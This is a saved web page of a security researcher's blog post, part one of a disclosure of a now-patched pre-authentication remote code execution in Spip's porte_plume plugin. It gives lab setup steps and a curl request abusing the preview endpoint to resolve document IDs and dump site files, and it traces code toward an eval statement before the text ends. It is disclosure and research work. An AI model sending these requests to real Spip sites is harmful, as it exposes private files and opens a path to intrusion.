<!DOCTYPE html>
<!-- saved from url=(0076)https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather/ -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link href="https://gmpg.org/xfn/11" rel="profile">
    <script type="text/javascript" async="" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/js"></script><script async="" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/custom.js.tải xuống"></script>
    
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public">
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
<meta name="generator" content="Hugo 0.57.2">

    
    
    

<title>Spip Preauth RCE 2024: Part 1, The Feather • Think
Love
Share</title>


<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Spip Preauth RCE 2024: Part 1, The Feather">
<meta name="twitter:description" content="We&#39;re in 2024, and we&#39;ll do some eval. Will you do some eval with me? It&#39;s been a while! Anyway, yes, we&#39;ll cover a new pre-authentication remote code execution on Spip, default installation, abusing a recent scary code change in the porte-plume plugin! :)">

<meta property="og:title" content="Spip Preauth RCE 2024: Part 1, The Feather">
<meta property="og:description" content="We&#39;re in 2024, and we&#39;ll do some eval. Will you do some eval with me? It&#39;s been a while! Anyway, yes, we&#39;ll cover a new pre-authentication remote code execution on Spip, default installation, abusing a recent scary code change in the porte-plume plugin! :)">
<meta property="og:type" content="article">
<meta property="og:url" content="/hacking/spip_preauth_rce_2024_part_1_the_feather/">
<meta property="article:published_time" content="2024-08-16T00:00:00+00:00">
<meta property="article:modified_time" content="2024-08-16T00:00:00+00:00">


    


<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/github.min.css">




<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/hyde-hyde.css">
<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/custom.css">
<link rel="stylesheet" href="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/print.min.css" media="print">
<script defer="" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/all.js.tải xuống" integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy" crossorigin="anonymous">
</script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thinkloveshare.com/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="https://thinkloveshare.com/favicon.png">
    
</head>

    <body>
        
<div class="sidebar">
  <div class="container sidebar-about ">
      <span class="site__title">
        <a href="https://thinkloveshare.com/">Think
Love
Share</a>
      </span>
          <a href="https://thinkloveshare.com/">
          
          
          
          <div class="author-image">
            <img src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
      <p class="site__description">
        <a href="https://thinkloveshare.com/">
         InfoSec, Code, Thoughts &amp; Feels 
      </a>
      </p>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="https://thinkloveshare.com/hacking/">
						<span>Hacking</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/offenskill/">
						<span>OffenSkill</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/streaming/">
						<span>Streaming</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/the_rest/">
						<span>The Rest</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/sponso/">
						<span>Sponso</span>
					</a>
				</li>
			
		 
			 
				<li>
					<a href="https://thinkloveshare.com/about/">
						<span>About</span>
					</a>
				</li>
			
		
	</ul>
</div>

    <section class="social">
	
	<a href="https://twitter.com/TheLaluka" rel="me"><svg class="svg-inline--fa fa-twitter fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	<a href="https://github.com/Laluka" rel="me"><svg class="svg-inline--fa fa-github fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="rotate fab fa-github fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	<a href="https://gitlab.com/TheLaluka" rel="me"><svg class="svg-inline--fa fa-gitlab fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="gitlab" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M29.782 199.732L256 493.714 8.074 309.699c-6.856-5.142-9.712-13.996-7.141-21.993l28.849-87.974zm75.405-174.806c-3.142-8.854-15.709-8.854-18.851 0L29.782 199.732h131.961L105.187 24.926zm56.556 174.806L256 493.714l94.257-293.982H161.743zm349.324 87.974l-28.849-87.974L256 493.714l247.926-184.015c6.855-5.142 9.711-13.996 7.141-21.993zm-85.404-262.78c-3.142-8.854-15.709-8.854-18.851 0l-56.555 174.806h131.961L425.663 24.926z"></path></svg><!-- <i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	<a href="https://linkedin.com/in/loukajc" rel="me"><svg class="svg-inline--fa fa-linkedin fa-w-14 rotate fa-lg" aria-hidden="true" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i> --></a>
	
	
	
	
	
	
	
	
	<a href="mailto:loukajc@gmail.com" rel="me"><svg class="svg-inline--fa fa-at fa-w-16 rotate fa-lg" aria-hidden="true" data-prefix="fas" data-icon="at" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C118.941 8 8 118.919 8 256c0 137.059 110.919 248 248 248 48.154 0 95.342-14.14 135.408-40.223 12.005-7.815 14.625-24.288 5.552-35.372l-10.177-12.433c-7.671-9.371-21.179-11.667-31.373-5.129C325.92 429.757 291.314 440 256 440c-101.458 0-184-82.542-184-184S154.542 72 256 72c100.139 0 184 57.619 184 160 0 38.786-21.093 79.742-58.17 83.693-17.349-.454-16.91-12.857-13.476-30.024l23.433-121.11C394.653 149.75 383.308 136 368.225 136h-44.981a13.518 13.518 0 0 0-13.432 11.993l-.01.092c-14.697-17.901-40.448-21.775-59.971-21.775-74.58 0-137.831 62.234-137.831 151.46 0 65.303 36.785 105.87 96 105.87 26.984 0 57.369-15.637 74.991-38.333 9.522 34.104 40.613 34.103 70.71 34.103C462.609 379.41 504 307.798 504 232 504 95.653 394.023 8 256 8zm-21.68 304.43c-22.249 0-36.07-15.623-36.07-40.771 0-44.993 30.779-72.729 58.63-72.729 22.292 0 35.601 15.241 35.601 40.77 0 45.061-33.875 72.73-58.161 72.73z"></path></svg><!-- <i class="rotate fas fa-at fa-lg" aria-hidden="true"></i> --></a>
	
	
    &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
    
    
    &nbsp;<a href="http://www.aperikube.fr/" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
    
    
    &nbsp;<a href="https://thinkloveshare-com.translate.goog/?_x_tr_sl=en&amp;_x_tr_tl=fr" target="blank" class="linklogo"><div class="rotate translate_logo logohover"></div></a>
    
</section>

    <section class="social">
  <div>
    Need a <b>Training</b>,<br><b>Pentest</b>, or <b>Code Audit</b>?
    <div class="h-wrap">
      Visit<a href="https://offenskill.com/" target="blank" class="linklogo linkoffenskill">OffenSkill.com</a>
      <a href="https://offenskill.com/" target="blank" class="linklogo"><div class="rotate offenskill_logo logohover"></div></a>
    </div>
  </div>
</section>

    <p class="copyright">
      © 2025 Laluka.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Licensing</a>.
      <br>Built with
      <a href="https://gohugo.io/">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Spip Preauth RCE 2024: Part 1, The Feather</h1>
    
    
<div class="post__meta">
    
      <svg class="svg-inline--fa fa-calendar-alt fa-w-14" aria-hidden="true" data-prefix="fas" data-icon="calendar-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M436 160H12c-6.6 0-12-5.4-12-12v-36c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48v36c0 6.6-5.4 12-12 12zM12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm116 204c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40z"></path></svg><!-- <i class="fas fa-calendar-alt"></i> --> Aug 16, 2024
    
    
    <svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="clock" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm57.1 350.1L224.9 294c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h48c6.6 0 12 5.4 12 12v137.7l63.5 46.2c5.4 3.9 6.5 11.4 2.6 16.8l-28.2 38.8c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg><!-- <i class="fas fa-clock"></i> --> 22 min read
    <svg class="svg-inline--fa fa-globe fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="globe" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M336.5 160C322 70.7 287.8 8 248 8s-74 62.7-88.5 152h177zM152 256c0 22.2 1.2 43.5 3.3 64h185.3c2.1-20.5 3.3-41.8 3.3-64s-1.2-43.5-3.3-64H155.3c-2.1 20.5-3.3 41.8-3.3 64zm324.7-96c-28.6-67.9-86.5-120.4-158-141.6 24.4 33.8 41.2 84.7 50 141.6h108zM177.2 18.4C105.8 39.6 47.8 92.1 19.3 160h108c8.7-56.9 25.5-107.8 49.9-141.6zM487.4 192H372.7c2.1 21 3.3 42.5 3.3 64s-1.2 43-3.3 64h114.6c5.5-20.5 8.6-41.8 8.6-64s-3.1-43.5-8.5-64zM120 256c0-21.5 1.2-43 3.3-64H8.6C3.2 212.5 0 233.8 0 256s3.2 43.5 8.6 64h114.6c-2-21-3.2-42.5-3.2-64zm39.5 96c14.5 89.3 48.7 152 88.5 152s74-62.7 88.5-152h-177zm159.3 141.6c71.4-21.2 129.4-73.7 158-141.6h-108c-8.8 56.9-25.6 107.8-50 141.6zM19.3 352c28.6 67.9 86.5 120.4 158 141.6-24.4-33.8-41.2-84.7-50-141.6h-108z"></path></svg><!-- <i class="fas fa-globe"></i> -->
    <a href="https://thinkloveshare-com.translate.goog/?_x_tr_sl=en&amp;_x_tr_tl=fr">Translate</a>
    <br> <svg class="svg-inline--fa fa-heart fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="heart" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"></path></svg><!-- <i class="fas fa-heart"></i> -->Any typos? Any ideas to suggest? Feedback appreciated!<svg class="svg-inline--fa fa-heart fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="heart" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"></path></svg><!-- <i class="fas fa-heart"></i> --><br>
</div>


  </header>
  <hr>
  <div class="post">
    

<p>Hi dear Sir, Madam. Please be informed that this is the <strong>third</strong> article dedicated to <a href="https://www.spip.net/">Spip</a> 0-day research, if you haven’t read the first ones, I’d recommend reading them first!</p>

<ul>
<li><a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">RCE on Spip and Root-Me</a></li>
<li><a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me_v2/">RCE on Spip and Root-Me, v2!</a></li>
</ul>

<p>This article will cover the <code>issue and exploit</code> for an <code>Unauthenticated Remote Code Execution</code> found on <code>Spip</code>, it has been patched in the releases for <a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html">4-3-0-alpha2, 4-2-13, and 4.1.16</a>.</p>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/release-note-security-headsup.png" alt=""></p>

<h2 id="what-s-the-setup-again">What’s the setup again?</h2>

<p>This issue was tested on the latest back then: <a href="https://files.spip.net/spip/archives/spip-v4.2.9.zip">4.2.9</a> Released the 8th of February 2024, its SHA1 hash is <a href="https://spip.lerebooteux.fr/Release-Notes-25">1987a75d18a57690e288be59e1c4a114cac51d84</a>.</p>

<p>Oh yeah, the issue came from the <a href="https://plugins.spip.net/porte_plume.html">porte_plume plugin</a>, so if you update spip without updating the plugins as well, you might still be exposed! 👏</p>

<pre><code class="language-bash hljs">mise install php@8.1.0       <span class="hljs-comment"># Recent install, should work on latest as well</span>
pecl install -f libsodium    <span class="hljs-comment"># Dependencies for Spip crypto stuff</span>
<span class="hljs-built_in">echo</span> extension=sodium.so | tee -a $(php --ini | grep -ioP <span class="hljs-string">"/.*/php.ini"</span>) <span class="hljs-comment"># Add sodium.so to our php.ini config file</span>
php -S 0.0.0.0:8000          <span class="hljs-comment"># Simple webserver</span>
http://0.0.0.0:8000/ecrire/  <span class="hljs-comment"># The url to visit in order to setup the site</span>
</code></pre>

<p>From there, pick a <code>sqlite</code> backend to keep the setup minimalist, create an admin account, and voilà, you’re done! It’s empty as hell, yet enough to be exploited!</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/working-spip-setup.png" alt=""></p>

<h2 id="how-was-it-caught">How was it caught?</h2>

<p>Two years ago, I built and deployed a simple cron task that would pull spip core and plugin changes daily at 9pm, split the diffs in small chunks of lines, render them, and push it to one of my private discord servers. It yielded a few cute results, but nothing too scary for a few months. I was already reading as much code as I could in the actual project, but in the meantime, having these new changes was helpful to know what were the current moving parts!</p>

<p>And one day, <a href="https://git.spip.net/spip/porte_plume/-/commit/3ca4cf78b96d927121c767a720203845071b7fda">this gem</a> came up!</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/spip-code-diff.png" alt=""></p>

<p>For interested readers, a <a href="https://github.com/laluka/push-my-diffs">dirty push-my-diffs PoC</a> has been released and shown during a <a href="https://www.youtube.com/watch?v=iFEDYryTKQw">livestream</a>! 😇</p>


<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/iFEDYryTKQw.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen="" title="YouTube Video"></iframe>
</div>


<p>Now, let’s head-out to the code part!</p>

<p>If you’re a French reader, you’ll quickly notice THE line.</p>

<blockquote>
<p>If there is php that comes from a model in here, it must be eval’d as it’s not a regular page.<br>
- Someone, probably a monday morning</p>
</blockquote>

<p>And the code does just that. If a flag states that modeles must be protected, then some sanitization takes place, then the page’s content ends up in an eval statement!</p>

<p>As I’ve been playing with Spip for a while now, I knew this piece of code lived in the <code>porte_plume</code> plugin, and was reachable without account!</p>

<p>So… Can we do it? Can we reach the mighty eval statement?</p>

<p><img class="img_small" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/thinking-mighty-eval.png" alt=""></p>

<h2 id="chaining-features-to-reach-eval">Chaining “features” to reach eval</h2>

<p>One bug already known by quite a few researchers is the ability to abuse the previsualization feature to resolve document or images IDs to full document links. This is an IDOR in itself, has been reported, but was -afaik- deemed too painful to patch, or not prioritized.</p>

<p>Let’s upload one image on our backend, and see how the link resolution feature behaves.</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/idor-id-to-url.png" alt=""></p>

<pre><code class="language-bash hljs">curl -sSkiL <span class="hljs-string">'http://0.0.0.0:8000/index.php?action=porte_plume_previsu'</span> -X POST -d <span class="hljs-string">'data=AA&lt;doc1&gt;BB'</span>
</code></pre>

<p>As stated, this allows us to resolve every document and images IDs to links. As files do not benefit extra protections nor ACL, once the full link (partial path and filename) is known, the file can be downloadded right away. We can basically abuse this feature to dump the whole site content. Banger!</p>

<p>But wait, there’s more!</p>

<p>The code received on discord states that if some php code lends in there, it will be eval’d, so can we get our code in there?</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/porte-plume-previsu-reflect.png" alt=""></p>

<p>Yes, no, maybe, it’s complicated… For now, the sanitization part catches us and surrounds our attempt with warnings. And breaks our payload. But the Spip templating engine is fairly complex and it’s definitely 100% spaghetti!</p>

<blockquote>
<p>No blame on the devs, it’s php, and will always be.</p>
</blockquote>

<p>By grepping around, we can determine that links are handled in a specific way to be resolved, while reading the function’s code, one can find that url slugs, text formats, and more can be (ab)used.</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 1, The Feather • Think Love Share_files/link-format-templating.png" alt=""></p>

<p>More can be found on the slug system with extra greps and code reading:</p>

<pre><code class="language-bash hljs">grep -riP <span class="hljs-string">'&gt;-&gt;'</span>
<span class="hljs-comment"># ecrire/public/assembler.php:    // Si un lien a ete passe en parametre, ex: [&lt;modele1&gt;-&gt;url] ou [&lt;modele1|title_du_lien{hreflang}-&gt;url]</span>
